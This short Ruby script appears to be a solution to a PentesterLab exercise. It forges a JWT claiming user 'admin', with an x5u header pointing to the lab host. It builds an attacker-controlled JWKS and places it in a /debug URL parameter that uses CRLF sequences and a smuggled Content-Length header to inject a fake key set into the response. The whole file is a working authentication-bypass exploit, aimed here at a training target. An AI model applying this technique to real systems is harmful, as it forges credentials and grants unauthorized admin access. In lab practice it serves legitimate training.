header = {"alg":"RS256","typ":"JWT","x5u":"http://ptl-aa49f84f-7230445d.libcurl.so/.well-known//jwks.json"}
body = {"user":"admin"}


require 'json'
require 'uri'


jwks = {"keys": [{"e": "AQAB", "kid": "pentesterlab", "kty": "RSA", "n": "3tTHI-f7RyZpFHQID0YDf3GlfEaDGEWAl5VZ7mFy07sGF-AQU26-0U4iIap4ajvpUS3BTZwA0fMHLl9jk9EBkpBBkhuJcFcqZ4m0cOcsmTwHCn5E-W40xQLBqiDhAuyXfkDO7tWa-b4aEbP-Ho9wbUw97zHMitUHfguJZv8zndM", "use": "sig", "alg": "RS256"}]}


jwk = JSON.dump jwks
len = jwk.size
url = "http://ptl-aa49f84f-7230445d.libcurl.so/debug?value=137%0d%0aContent-Length:+#{len}%0d%0a%0d%0a#{URI.escape(jwk,"[]{}")}"

puts url
